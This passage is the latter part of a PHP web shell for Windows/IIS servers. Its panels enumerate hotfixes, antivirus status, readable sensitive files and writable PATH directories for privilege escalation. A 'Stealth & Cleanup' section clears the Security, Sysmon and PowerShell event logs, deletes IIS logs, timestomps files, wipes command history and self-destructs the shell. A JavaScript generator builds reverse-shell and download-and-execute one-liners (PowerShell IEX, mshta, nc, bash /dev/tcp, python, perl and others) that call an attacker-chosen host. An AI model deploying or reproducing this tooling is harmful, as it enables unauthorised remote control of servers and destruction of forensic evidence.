        ];
        foreach ($sensitive as $sf):
            $readable = is_readable($sf);
        ?>
        <tr>
            <td style="font-size:11px"><?= htmlspecialchars($sf) ?></td>
            <td><span class="badge <?= $readable ? 'badge-green' : 'badge-red' ?>"><?= $readable ? 'READABLE' : 'No access' ?></span></td>
        </tr>
        <?php endforeach; ?>
        </table>
    </div></div>
</div>

<div class="tab-content" id="priv-misc">
    <div class="panel"><div class="panel-head"><h3>Installed Hotfixes</h3></div><div class="panel-body">
        <pre style="font-size:10px;color:var(--text);line-height:1.5;white-space:pre-wrap;max-height:300px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('wmic qfe get HotFixID,InstalledOn,Description /format:list'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Antivirus Products</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /format:list 2>&1'))) ?></pre>
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap;margin-top:8px"><?= htmlspecialchars(trim(run_cmd('powershell -c "Get-MpComputerStatus | Select-Object AMServiceEnabled,AntispywareEnabled,AntivirusEnabled,RealTimeProtectionEnabled | Format-List" 2>&1'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>PATH Directories (Writable Check)</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap"><?php
            $path_dirs = explode(';', getenv('PATH') ?: '');
            foreach ($path_dirs as $pd) {
                $pd = trim($pd);
                if (!$pd) continue;
                $writable = is_writable($pd) ? '  [WRITABLE]' : '';
                $color = $writable ? 'var(--accent)' : 'var(--text2)';
                echo '<span style="color:' . $color . '">' . htmlspecialchars($pd) . $writable . "</span>\n";
            }
        ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Installed Software</h3></div><div class="panel-body">
        <pre style="font-size:10px;color:var(--text);line-height:1.5;white-space:pre-wrap;max-height:300px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('wmic product get name,version /format:list 2>&1'))) ?></pre>
    </div></div>
</div>

<?php
// ============================================================
//  ENCODING UTILITIES
// ============================================================
elseif ($page === 'encoding'):
    $enc_input  = $_POST['enc_input'] ?? '';
    $enc_output = '';
    $enc_action = $_POST['enc_action'] ?? '';

    if ($enc_input !== '' && $enc_action !== '') {
        switch ($enc_action) {
            case 'b64_enc':   $enc_output = base64_encode($enc_input); break;
            case 'b64_dec':   $enc_output = base64_decode($enc_input); break;
            case 'hex_enc':   $enc_output = bin2hex($enc_input); break;
            case 'hex_dec':   $enc_output = @hex2bin(preg_replace('/\s+/', '', $enc_input)) ?: 'Invalid hex'; break;
            case 'url_enc':   $enc_output = urlencode($enc_input); break;
            case 'url_dec':   $enc_output = urldecode($enc_input); break;
            case 'html_enc':  $enc_output = htmlspecialchars($enc_input, ENT_QUOTES); break;
            case 'html_dec':  $enc_output = htmlspecialchars_decode($enc_input, ENT_QUOTES); break;
            case 'rot13':     $enc_output = str_rot13($enc_input); break;
            case 'md5':       $enc_output = md5($enc_input); break;
            case 'sha1':      $enc_output = sha1($enc_input); break;
            case 'sha256':    $enc_output = hash('sha256', $enc_input); break;
            case 'sha512':    $enc_output = hash('sha512', $enc_input); break;
            case 'crc32':     $enc_output = sprintf('%08x', crc32($enc_input)); break;
            default:          $enc_output = 'Unknown action';
        }
    }
?>

<div class="grid grid-2">
    <div class="panel"><div class="panel-head"><h3>Input</h3></div><div class="panel-body">
        <form method="post" id="encForm">
            <input type="hidden" name="enc_action" id="encAction" value="">
            <textarea name="enc_input" style="height:200px" placeholder="Enter text to encode/decode/hash..."><?= htmlspecialchars($enc_input) ?></textarea>
        </form>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Output</h3></div><div class="panel-body">
        <textarea readonly style="height:200px;color:var(--accent)" id="encOutput"><?= htmlspecialchars($enc_output) ?></textarea>
        <button class="btn btn-sm" style="margin-top:8px" onclick="navigator.clipboard.writeText(document.getElementById('encOutput').value)">Copy</button>
    </div></div>
</div>

<div class="panel"><div class="panel-head"><h3>Operations</h3></div><div class="panel-body">
    <div style="display:flex;gap:8px;flex-wrap:wrap">
        <div style="flex:1;min-width:200px">
            <div style="color:var(--text2);font-size:10px;margin-bottom:6px;text-transform:uppercase">Encoding</div>
            <div style="display:flex;gap:4px;flex-wrap:wrap">
                <button class="btn btn-sm" onclick="doEnc('b64_enc')">Base64 Enc</button>
                <button class="btn btn-sm" onclick="doEnc('b64_dec')">Base64 Dec</button>
                <button class="btn btn-sm" onclick="doEnc('hex_enc')">Hex Enc</button>
                <button class="btn btn-sm" onclick="doEnc('hex_dec')">Hex Dec</button>
                <button class="btn btn-sm" onclick="doEnc('url_enc')">URL Enc</button>
                <button class="btn btn-sm" onclick="doEnc('url_dec')">URL Dec</button>
                <button class="btn btn-sm" onclick="doEnc('html_enc')">HTML Enc</button>
                <button class="btn btn-sm" onclick="doEnc('html_dec')">HTML Dec</button>
                <button class="btn btn-sm" onclick="doEnc('rot13')">ROT13</button>
            </div>
        </div>
        <div style="flex:1;min-width:200px">
            <div style="color:var(--text2);font-size:10px;margin-bottom:6px;text-transform:uppercase">Hashing</div>
            <div style="display:flex;gap:4px;flex-wrap:wrap">
                <button class="btn btn-sm" onclick="doEnc('md5')">MD5</button>
                <button class="btn btn-sm" onclick="doEnc('sha1')">SHA1</button>
                <button class="btn btn-sm" onclick="doEnc('sha256')">SHA256</button>
                <button class="btn btn-sm" onclick="doEnc('sha512')">SHA512</button>
                <button class="btn btn-sm" onclick="doEnc('crc32')">CRC32</button>
            </div>
        </div>
    </div>
</div></div>

<?php
// ============================================================
//  STEALTH & CLEANUP — WINDOWS
// ============================================================
elseif ($page === 'stealth'): ?>

<div class="tabs" id="stealthTabs">
    <div class="tab active" data-tab="st-logs">Event Logs</div>
    <div class="tab" data-tab="st-iis">IIS Logs</div>
    <div class="tab" data-tab="st-timestomp">Timestomp</div>
    <div class="tab" data-tab="st-history">History</div>
    <div class="tab" data-tab="st-destruct">Self-Destruct</div>
</div>

<div class="tab-content active" id="st-logs">
    <div class="panel"><div class="panel-head"><h3>Windows Event Logs</h3></div><div class="panel-body">
        <table class="tbl">
            <tr><th>Log</th><th>Records</th><th>Action</th></tr>
            <?php
            $event_logs = ['Application', 'Security', 'System', 'Setup', 'Windows PowerShell', 'Microsoft-Windows-Sysmon/Operational', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'];
            foreach ($event_logs as $elog):
                $info = trim(run_cmd('wevtutil gli "' . $elog . '" 2>&1'));
                $records = 'N/A';
                if (preg_match('/numberOfLogRecords:\s*(\d+)/i', $info, $m)) $records = $m[1];
            ?>
            <tr>
                <td style="font-size:11px"><?= htmlspecialchars($elog) ?></td>
                <td><?= $records ?></td>
                <td>
                    <form method="post" style="display:inline">
                        <input type="hidden" name="clear_log" value="<?= htmlspecialchars($elog) ?>">
                        <button class="btn btn-sm btn-red" type="submit" onclick="return confirm('Clear <?= htmlspecialchars($elog) ?> event log?')">Clear</button>
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
    </div></div>
</div>

<div class="tab-content" id="st-iis">
    <div class="panel"><div class="panel-head"><h3>IIS Log Files</h3></div><div class="panel-body">
        <?php
        $iis_log_dirs = ['C:\\inetpub\\logs\\LogFiles', 'C:\\Windows\\System32\\LogFiles\\W3SVC1', 'C:\\Windows\\System32\\LogFiles\\W3SVC2'];
        foreach ($iis_log_dirs as $logdir):
            if (is_dir($logdir)):
        ?>
        <div style="margin-bottom:16px">
            <div style="color:var(--cyan);font-size:11px;margin-bottom:8px"><?= htmlspecialchars($logdir) ?></div>
            <table class="tbl">
                <tr><th>File</th><th>Size</th><th>Modified</th><th>Action</th></tr>
                <?php
                $logfiles = @scandir($logdir);
                if ($logfiles) {
                    foreach ($logfiles as $lf) {
                        if ($lf === '.' || $lf === '..') continue;
                        $lfull = $logdir . '\\' . $lf;
                        if (is_dir($lfull)) {
                            $subfiles = @scandir($lfull);
                            if ($subfiles) foreach ($subfiles as $sf) {
                                if ($sf === '.' || $sf === '..') continue;
                                $sfull = $lfull . '\\' . $sf;
                                if (is_file($sfull)) {
                                    echo '<tr><td style="font-size:10px">' . htmlspecialchars($lf . '\\' . $sf) . '</td>';
                                    echo '<td>' . fmt_bytes(@filesize($sfull)) . '</td>';
                                    echo '<td style="font-size:10px">' . date('Y-m-d H:i', @filemtime($sfull)) . '</td>';
                                    echo '<td><form method="post" style="display:inline"><input type="hidden" name="clear_log" value="' . htmlspecialchars($sfull) . '"><button class="btn btn-sm btn-red" type="submit" onclick="return confirm(\'Clear?\')">Clear</button></form></td></tr>';
                                }
                            }
                        } elseif (is_file($lfull)) {
                            echo '<tr><td style="font-size:10px">' . htmlspecialchars($lf) . '</td>';
                            echo '<td>' . fmt_bytes(@filesize($lfull)) . '</td>';
                            echo '<td style="font-size:10px">' . date('Y-m-d H:i', @filemtime($lfull)) . '</td>';
                            echo '<td><form method="post" style="display:inline"><input type="hidden" name="clear_log" value="' . htmlspecialchars($lfull) . '"><button class="btn btn-sm btn-red" type="submit" onclick="return confirm(\'Clear?\')">Clear</button></form></td></tr>';
                        }
                    }
                }
                ?>
            </table>
        </div>
        <?php endif; endforeach; ?>
    </div></div>
</div>

<div class="tab-content" id="st-timestomp">
    <div class="panel"><div class="panel-head"><h3>Timestomp (Modify File Timestamps)</h3></div><div class="panel-body">
        <form method="post">
            <div class="form-row"><label>File</label><input type="text" name="ts_file" placeholder="C:\path\to\file" style="width:400px"></div>
            <div class="form-row"><label>Timestamp</label><input type="text" name="ts_time" placeholder="2023-01-15 08:30:00" style="width:200px"><span style="color:var(--text2);font-size:10px">YYYY-MM-DD HH:MM:SS</span></div>
            <button class="btn btn-green" type="submit">Apply Timestamps</button>
        </form>
    </div></div>
</div>

<div class="tab-content" id="st-history">
    <div class="panel"><div class="panel-head"><h3>PowerShell / CMD History</h3></div><div class="panel-body">
        <form method="post">
            <input type="hidden" name="clear_history" value="1">
            <p style="color:var(--text2);margin-bottom:12px;font-size:12px">Clears PSReadLine history (ConsoleHost_history.txt) and CMD doskey buffer.</p>
            <button class="btn btn-red" type="submit" onclick="return confirm('Clear all history files?')">Clear All History</button>
        </form>
        <?php
        $profile = trim(getenv('USERPROFILE') ?: run_cmd('echo %USERPROFILE%'));
        $ps_hist = $profile . '\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt';
        if (file_exists($ps_hist)):
        ?>
        <div style="margin-top:16px">
            <div style="color:var(--cyan);font-size:11px;margin-bottom:6px"><?= htmlspecialchars($ps_hist) ?> (<?= fmt_bytes(@filesize($ps_hist)) ?>)</div>
        </div>
        <?php endif; ?>
    </div></div>
</div>

<div class="tab-content" id="st-destruct">
    <div class="panel" style="border-color:var(--red)"><div class="panel-head" style="border-color:var(--red)"><h3 style="color:var(--red)">⚠ Self-Destruct</h3></div><div class="panel-body">
        <p style="color:var(--red);margin-bottom:16px">This will permanently delete this shell file and destroy the session. This action cannot be undone.</p>
        <p style="color:var(--text2);margin-bottom:16px;font-size:11px">File: <?= htmlspecialchars(__FILE__) ?></p>
        <form method="post">
            <div class="form-row"><label style="color:var(--red)">Type CONFIRM</label><input type="text" name="self_destruct" placeholder="Type CONFIRM to proceed" style="width:200px;border-color:var(--red)"></div>
            <button class="btn btn-red" type="submit" onclick="return confirm('FINAL WARNING: Delete this shell permanently?')">Self-Destruct</button>
        </form>
    </div></div>
</div>

<?php endif; ?>

</div>
</div>

<script>
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() {
        const group = this.parentElement;
        group.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        this.classList.add('active');
        const targetId = this.getAttribute('data-tab');
        let sibling = group.nextElementSibling;
        while (sibling && sibling.classList.contains('tab-content')) {
            sibling.classList.remove('active');
            if (sibling.id === targetId) sibling.classList.add('active');
            sibling = sibling.nextElementSibling;
        }
    });
});

function generateShell() {
    const ip = document.getElementById('rs_ip').value;
    const port = document.getElementById('rs_port').value;
    const type = document.getElementById('rs_type').value;
    const out = document.getElementById('rs_output');

    const ps_payload = `$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`;

    const shells = {
        'powershell':     `powershell -nop -ep bypass -c "${ps_payload}"`,
        'powershell_b64': `powershell -nop -ep bypass -enc ` + btoa(unescape(encodeURIComponent(ps_payload))),
        'powershell_iex': `powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://${ip}:${port}/shell.ps1')"`,
        'php':            `php -r "$sock=fsockopen('${ip}',${port});exec('cmd.exe /c <&3 >&3 2>&3');"`,
        'python':         `python -c "import socket,subprocess,os;s=socket.socket();s.connect(('${ip}',${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])"`,
        'nc':             `nc.exe -e cmd.exe ${ip} ${port}`,
        'mshta':          `mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://${ip}:${port}/shell.ps1')"", 0:close")`,
        'bash':           `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
        'perl':           `perl -e "use Socket;$i='${ip}';$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('cmd.exe');"`,
        'ruby':           `ruby -rsocket -e "f=TCPSocket.open('${ip}',${port}).to_i;exec sprintf('cmd.exe <&%d >&%d 2>&%d',f,f,f)"`,
        'socat':          `socat exec:'cmd.exe',pipes tcp:${ip}:${port}`
    };
    out.value = shells[type] || 'Unknown type';
}

function doEnc(action) {
    document.getElementById('encAction').value = action;
    document.getElementById('encForm').submit();
}

if (document.getElementById('rs_output')) generateShell();

const termOut = document.getElementById('termOutput');
if (termOut) termOut.scrollTop = termOut.scrollHeight;
</script>
</body></html>
